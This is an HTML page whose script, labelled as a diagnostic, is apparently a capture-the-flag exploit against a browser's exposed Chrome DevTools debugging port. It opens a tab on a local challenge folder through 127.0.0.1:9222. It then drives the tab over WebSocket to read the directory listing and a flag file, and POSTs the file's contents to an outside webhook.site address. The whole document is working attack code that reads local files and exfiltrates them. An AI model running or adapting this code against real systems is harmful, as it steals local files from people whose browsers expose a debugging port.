<!doctype html>
<html>
<body>
<pre id="out">Starting diagnostic...</pre>

<script>
(async () => {
  const out = document.getElementById("out");
  const sleep = ms => new Promise(r => setTimeout(r, ms));

  async function evaluate(ws, expression, id) {
    return new Promise((resolve, reject) => {
      const timeout = setTimeout(
        () => reject(new Error("CDP evaluation timeout")),
        2500
      );

      function handler(event) {
        const msg = JSON.parse(event.data);
        if (msg.id !== id) return;
        clearTimeout(timeout);
        ws.removeEventListener("message", handler);
        resolve(msg);
      }

      ws.addEventListener("message", handler);
      ws.send(JSON.stringify({
        id,
        method: "Runtime.evaluate",
        params: {
          expression,
          returnByValue: true
        }
      }));
    });
  }

  try {
    const response = await fetch(
      "http://127.0.0.1:9222/json/new?file:///challenge/",
      { method: "PUT" }
    );

    const target = await response.json();
    const ws = new WebSocket(target.webSocketDebuggerUrl);

    await new Promise((resolve, reject) => {
      ws.onopen = resolve;
      ws.onerror = reject;
    });

    await sleep(800);

    const result = await evaluate(
      ws,
      "document.body.innerText",
      1
    );

    const listing = result.result?.result?.value ?? JSON.stringify(result);
    out.textContent = "Directory result:\n" + listing;

    const match = listing.match(/flag-[a-f0-9]+/i);

    if (match) {
      ws.send(JSON.stringify({
        id: 2,
        method: "Page.navigate",
        params: {
          url: "file:///challenge/" + match[0]
        }
      }));

      await sleep(800);

      const flagResult = await evaluate(
        ws,
        "document.body.innerText",
        3
      );

      const flag = flagResult.result?.result?.value ?? JSON.stringify(flagResult);

      out.textContent += "\n\nFile result:\n" + flag;

      await fetch(
        "https://webhook.site/a66ae4f5-fdf1-46dd-acff-05d5c108df64",
        {
          method: "POST",
          mode: "no-cors",
          body: flag
        }
      );
    }

    ws.close();
  } catch (error) {
    out.textContent += "\nError: " + error.message;
  }
})();
</script>
</body>
</html>
